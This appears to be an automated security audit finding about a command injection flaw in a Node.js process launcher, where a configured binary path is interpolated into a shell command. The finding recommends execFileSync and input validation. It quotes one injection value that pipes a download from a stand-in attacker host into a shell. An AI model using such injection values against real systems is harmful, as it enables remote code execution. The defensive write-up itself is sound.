# [MEDIUM] Command injection via shell-interpolated binaryPath in execSync

**File:** [`src/clients/codex-process.js`](https://github.com/Fast-Editor/Lynkr/blob/feat/parallel-tool-execution/blob/feat/src/clients/codex-process.js#L36-L58) (lines 36, 58)
**Project:** claude-code
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `vishalveera.reddy@servicenow.com` _(via last-committer)_

## Finding

`execSync(\`which ${binaryPath}\`, { stdio: 'ignore' })` at L36 interpolates `binaryPath` (from `config.codex?.binaryPath`, sourced via `process.env.CODEX_BINARY_PATH`, see src/config/index.js:623) into a shell command. `execSync` invokes the system shell by default, so any shell metacharacter in the value is interpreted. A value like `codex; curl evil.example/x | sh` would execute the trailing command, achieving RCE. The threat model is constrained — the env var is operator-controlled at deploy time, not user-controlled per-request — but unsafe shell composition is a poor primitive: it turns any future leak path of `CODEX_BINARY_PATH` (config injection bug, container env mounting issue, accidental exposure to a less-trusted process) into RCE rather than a benign 'binary not found'. The same pattern is repeated at L58 where `spawn(binaryPath, ['app-server'], { shell: process.platform === 'win32' })` enables shell interpretation on Windows, exposing the same shell-metacharacter injection on that platform (on Linux/macOS, `shell: false` keeps spawn safe). The `taskkill` call at L301 uses `this.child.pid`, which is set by Node to a numeric PID — that one is not exploitable.

## Recommendation

Replace `execSync(\`which ${binaryPath}\`)` with `execFileSync('which', [binaryPath], { stdio: 'ignore' })` (or `where` on Windows). `execFile`/`execFileSync` does not invoke a shell, so arguments are passed as a literal argv vector with no metacharacter interpretation. Additionally, drop `shell: process.platform === 'win32'` from the spawn call — spawn doesn't need a shell to launch a binary by absolute or PATH-resolvable name on Windows, and removing it eliminates the Windows-specific injection path. Optionally, validate that `binaryPath` matches a strict pattern (e.g., `/^[A-Za-z0-9._/\\-]+$/`) before passing it to any process-launch API.

## Recent committers (`git log`)

- vishal veerareddy <vishalveera.reddy@servicenow.com> (2026-03-24)
